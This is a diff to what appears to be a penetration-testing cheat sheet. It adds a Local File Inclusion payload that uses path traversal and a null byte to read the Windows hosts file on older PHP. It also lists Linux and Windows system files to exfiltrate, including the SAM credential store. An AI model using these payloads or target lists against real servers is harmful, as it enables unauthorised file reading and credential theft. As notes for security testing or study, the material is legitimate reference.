@@ -7,8 +7,17 @@
 
 ## SQL Injection
 
+# Local File Inclusion (LFI)
+In versions of PHP below 5.3 can terminate with a null byte
+```
+?name=Haxor&type=2&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
+```
 
-## Exfiltrate Linux Files - Local File Inclusion
+## Enumerating LFI
+
+
+
+## Exfiltrate Linux Files
 ```
 /etc/issue
 /proc/version
@@ -23,7 +32,7 @@
 ...log files
 ```
 
-## Exfiltrate Windows Files - Local File Inclusion
+## Exfiltrate Windows Files
 ```
 %SYSTEMROOT%\repair\system
 %SYSTEMROOT%\repair\SAM
